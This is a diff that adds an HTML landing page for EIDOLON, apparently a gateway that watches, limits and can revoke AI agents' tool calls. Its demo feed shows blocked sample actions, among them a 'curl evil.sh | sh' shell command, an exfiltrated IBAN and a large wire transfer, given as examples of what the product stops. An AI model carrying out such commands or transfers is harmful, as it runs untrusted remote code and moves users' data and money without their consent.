@@ -1,0 +1,200 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>EIDOLON — your agent, on a leash you hold</title>
+<meta name="description" content="See everything your AI agent does. Bound what it may do. Prove what it did. A cryptographic authority layer for any MCP agent." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet" />
+<style>
+  :root {
+    --bg:#07090f; --panel:#0d1119; --ink:#d7e0ea; --dim:#7a8699; --line:#1c2533;
+    --green:#39d98a; --amber:#f2b84b; --red:#ff5c5c; --cyan:#4fc7ff; --accent:#8b7bff;
+    --pixel:"Press Start 2P", monospace;
+  }
+  * { box-sizing:border-box; }
+  html { scroll-behavior:smooth; }
+  body { margin:0; background:var(--bg); color:var(--ink);
+    font:15px/1.65 ui-monospace,"SF Mono",Menlo,Consolas,monospace; overflow-x:hidden; }
+  /* CRT scanlines + vignette */
+  body::before { content:""; position:fixed; inset:0; pointer-events:none; z-index:9;
+    background:repeating-linear-gradient(0deg, rgba(0,0,0,.16) 0 1px, transparent 1px 3px); }
+  body::after { content:""; position:fixed; inset:0; pointer-events:none; z-index:9;
+    background:radial-gradient(ellipse at center, transparent 55%, rgba(0,0,0,.45) 100%); }
+  a { color:var(--cyan); text-decoration:none; }
+  .wrap { max-width:980px; margin:0 auto; padding:0 22px; }
+  nav { display:flex; justify-content:space-between; align-items:center; padding:18px 0; }
+  .logo { font-family:var(--pixel); font-size:13px; color:var(--accent); letter-spacing:1px; }
+  nav .links { display:flex; gap:18px; font-size:13px; }
+  /* hero */
+  .hero { text-align:center; padding:52px 0 30px; }
+  .hero pre { color:var(--accent); font-size:9px; line-height:1.25; margin:0 auto 22px;
+    display:inline-block; text-align:left; text-shadow:0 0 12px rgba(139,123,255,.45); }
+  h1 { font-family:var(--pixel); font-size:clamp(15px, 3.4vw, 26px); line-height:1.7;
+    margin:0 0 14px; }
+  h1 .g { color:var(--green); } h1 .r { color:var(--red); } h1 .c { color:var(--cyan); }
+  .sub { color:var(--dim); max-width:640px; margin:0 auto 26px; font-size:14.5px; }
+  .press { display:inline-block; font-family:var(--pixel); font-size:13px; padding:16px 26px;
+    background:var(--accent); color:#0b0714; border:0; border-radius:4px; cursor:pointer;
+    box-shadow:0 6px 0 #5c4fd1; animation:blink 1.4s steps(2) infinite; }
+  .press:hover { transform:translateY(2px); box-shadow:0 4px 0 #5c4fd1; animation:none; }
+  @keyframes blink { 50% { filter:brightness(1.35); } }
+  .alt { margin-top:14px; font-size:13px; color:var(--dim); }
+  /* attract-mode counters */
+  .counters { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; margin:36px 0 6px; }
+  .counter { background:var(--panel); border:1px solid var(--line); border-radius:8px;
+    padding:14px 20px; min-width:180px; }
+  .counter .n { font-family:var(--pixel); font-size:16px; color:var(--green); }
+  .counter .l { color:var(--dim); font-size:11px; margin-top:8px; letter-spacing:.5px; }
+  /* sections */
+  section { padding:44px 0 10px; }
+  h2 { font-family:var(--pixel); font-size:13px; color:var(--amber); margin:0 0 22px;
+    letter-spacing:1px; }
+  h2::before { content:"▸ "; color:var(--dim); }
+  /* level select */
+  .levels { display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:14px; }
+  .lvl { background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:18px; }
+  .lvl:hover { border-color:var(--accent); }
+  .lvl .t { font-family:var(--pixel); font-size:10px; color:var(--cyan); margin-bottom:12px; }
+  .lvl p { margin:0; color:var(--dim); font-size:13px; }
+  .lvl code { display:block; background:#070a10; border-radius:6px; padding:10px 12px;
+    margin-top:12px; font-size:11.5px; color:var(--green); overflow-x:auto; white-space:pre; }
+  /* feed demo */
+  .feeddemo { background:var(--panel); border:1px solid var(--line); border-radius:10px;
+    padding:16px 18px; font-size:13px; }
+  .frow { display:flex; gap:10px; padding:6px 0; border-bottom:1px dashed var(--line);
+    align-items:center; }
+  .frow:last-child { border-bottom:0; }
+  .b { font-family:var(--pixel); font-size:8px; padding:5px 8px; border-radius:3px; min-width:88px;
+    text-align:center; }
+  .b.ok { background:rgba(57,217,138,.15); color:var(--green); }
+  .b.warn { background:rgba(242,184,75,.15); color:var(--amber); }
+  .b.deny { background:rgba(255,92,92,.18); color:var(--red); }
+  .b.kill { background:var(--red); color:#0b0714; }
+  .frow .d { color:var(--dim); font-size:12px; }
+  /* ranks */
+  .ranks { display:grid; grid-template-columns:repeat(auto-fit,minmax(210px,1fr)); gap:12px; }
+  .rank { border:1px solid var(--line); background:var(--panel); border-radius:10px;
+    padding:16px; text-align:center; }
+  .rank .rn { font-family:var(--pixel); font-size:10px; }
+  .rank .rd { color:var(--dim); font-size:12px; margin-top:10px; }
+  .rank.r1 .rn { color:var(--dim); } .rank.r2 .rn { color:var(--cyan); }
+  .rank.r3 .rn { color:var(--amber); } .rank.r4 .rn { color:var(--green); }
+  /* cred strip */
+  .cred { display:flex; gap:10px 26px; flex-wrap:wrap; justify-content:center;
+    color:var(--dim); font-size:12px; padding:26px 0 8px; }
+  .cred b { color:var(--ink); }
+  footer { border-top:1px solid var(--line); margin-top:44px; padding:22px 0 40px;
+    color:var(--dim); font-size:12.5px; display:flex; justify-content:space-between;
+    flex-wrap:wrap; gap:10px; }
+  .tiny { font-size:11px; color:var(--dim); }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <nav>
+    <span class="logo">EIDOLON</span>
+    <span class="links">
+      <a href="/challenge">arcade</a>
+      <a href="https://gitlab.com/mthandazogegane/eidolon" target="_blank" rel="noopener">source</a>
+      <a href="/signup">sign in</a>
+    </span>
+  </nav>
+
+  <div class="hero">
+    <pre>
+▓█████  ██▓▓█████▄  ▒█████   ██▓     ▒█████   ███▄    █
+▓█   ▀ ▓██▒▒██▀ ██▌▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██ ▀█   █
+▒███   ▒██▒░██   █▌▒██░  ██▒▒██░    ▒██░  ██▒▓██  ▀█ ██▒
+▒▓█  ▄ ░██░░▓█▄   ▌▒██   ██░▒██░    ▒██   ██░▓██▒  ▐▌██▒
+░▒████▒░██░░▒████▓ ░ ████▓▒░░██████▒░ ████▓▒░▒██░   ▓██░
+░░ ▒░ ░░▓   ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒</pre>
+    <h1>YOUR AGENT.<br/>
+      <span class="g">SEEN.</span> <span class="c">BOUNDED.</span> <span class="r">REVOCABLE.</span></h1>
+    <div class="sub">AI agents act with your authority and none of your restraint. EIDOLON is
+      the layer in between: watch every tool call live, delegate exactly the authority you
+      choose, and kill it mid-session — all cryptographically enforced, every action on a
+      tamper-evident ledger.</div>
+    <a href="/signup"><button class="press">▶ PRESS START</button></a>
+    <div class="alt">2-player mode: <a href="/challenge">try to break the gate first</a> — no signup.</div>
+    <div class="counters">
+      <div class="counter"><div class="n" id="cActions">…</div><div class="l">ACTIONS GOVERNED</div></div>
+      <div class="counter"><div class="n" id="cBlocks">…</div><div class="l">ATTACKS BLOCKED</div></div>
+      <div class="counter"><div class="n" id="cAgents">…</div><div class="l">AGENTS ENROLLED</div></div>
+    </div>
+  </div>
+
+  <section>
+    <h2>WHAT YOU SEE WHEN YOUR AGENT MOVES</h2>
+    <div class="feeddemo" id="demoFeed">
+      <div class="frow"><span class="b ok">ACT</span><span>read_file · src/app.py</span><span class="d">— routine, attested</span></div>
+      <div class="frow"><span class="b ok">ACT</span><span>run_tests · 42 passed</span><span class="d">— routine, attested</span></div>
+      <div class="frow"><span class="b warn">HELD</span><span>send_email · to: client@corp.com</span><span class="d">— drafted, waiting for you</span></div>
+      <div class="frow"><span class="b deny">DENY</span><span>post_status · "…IBAN DE89 3704…"</span><span class="d">— exfiltration of a value read 3 calls ago</span></div>
+      <div class="frow"><span class="b deny">DENY</span><span>wire_funds · $250,000</span><span class="d">— excluded: financial-commitment</span></div>
+      <div class="frow"><span class="b kill">KILLED</span><span>run_shell · curl evil.sh | sh</span><span class="d">— you pressed the red button</span></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>LEVEL SELECT — CONNECT IN 3 MOVES</h2>
+    <div class="levels">
+      <div class="lvl"><div class="t">LEVEL 1 · ENROLL</div>
+        <p>Press start, name your agent, pick the authority you delegate. That's the whole
+        config — a signed, revocable credential is minted underneath.</p></div>
+      <div class="lvl"><div class="t">LEVEL 2 · WRAP</div>
+        <p>Point your agent at the gateway instead of its raw tools. Claude Code, Hermes,
+        Cursor, anything MCP — zero agent changes.</p>
+        <code>python -m eidolon.gateway --config gateway.yaml \
+  -- npx -y @modelcontextprotocol/server-filesystem .</code></div>
+      <div class="lvl"><div class="t">LEVEL 3 · WATCH</div>
+        <p>Open mission control. Your agent's actions stream live — green flows, amber waits
+        for your approval, red never happened. The red button is yours.</p></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>AUTONOMY IS EARNED, NOT ASSUMED</h2>
+    <div class="ranks">
+      <div class="rank r1"><div class="rn">OBSERVER</div><div class="rd">reads &amp; answers.
+        everything else held.</div></div>
+      <div class="rank r2"><div class="rn">DRAFTER</div><div class="rd">+ drafts &amp; status.
+        commits escalate.</div></div>
+      <div class="rank r3"><div class="rn">OPERATIVE</div><div class="rd">acts on routine work.
+        exclusions still bite.</div></div>
+      <div class="rank r4"><div class="rn">AUTONOMOUS</div><div class="rd">earned by surviving
+        adversarial certification.</div></div>
+    </div>
+    <p class="tiny" style="margin-top:14px">Boss fight included: agents level up only by
+      containing fresh attacks, round after round. Losing a round drops the ceiling.</p>
+  </section>
+
+  <div class="cred">
+    <span><b>Ed25519</b> signed delegations</span>
+    <span><b>TLA+</b> machine-checked gate</span>
+    <span><b>96%</b> injections contained · <b>0%</b> benign broken (AgentDojo)</span>
+    <span><b>~1ms</b> decision p95</span>
+    <span>hash-chained <b>attestation ledger</b></span>
+  </div>
+
+  <footer>
+    <span>EIDOLON — provable delegated agency · built on <a href="https://github.com/l33tdawg/sage" target="_blank" rel="noopener">SAGE</a></span>
+    <span><a href="/challenge">arcade</a> · <a href="/showcase">showcase</a> ·
+      <a href="https://gitlab.com/mthandazogegane/eidolon/-/blob/main/docs/whitepaper.pdf" target="_blank" rel="noopener">white paper</a> ·
+      <a href="/login">operator</a></span>
+  </footer>
+</div>
+<script>
+(async () => {
+  try {
+    const s = await (await fetch("/stats/public")).json();
+    const fmt = (n) => n.toLocaleString();
+    document.getElementById("cActions").textContent = fmt(s.actions_governed);
+    document.getElementById("cBlocks").textContent = fmt(s.attacks_blocked);
+    document.getElementById("cAgents").textContent = fmt(s.agents_enrolled);
+  } catch {}
+})();
+</script>
+</body>
+</html>
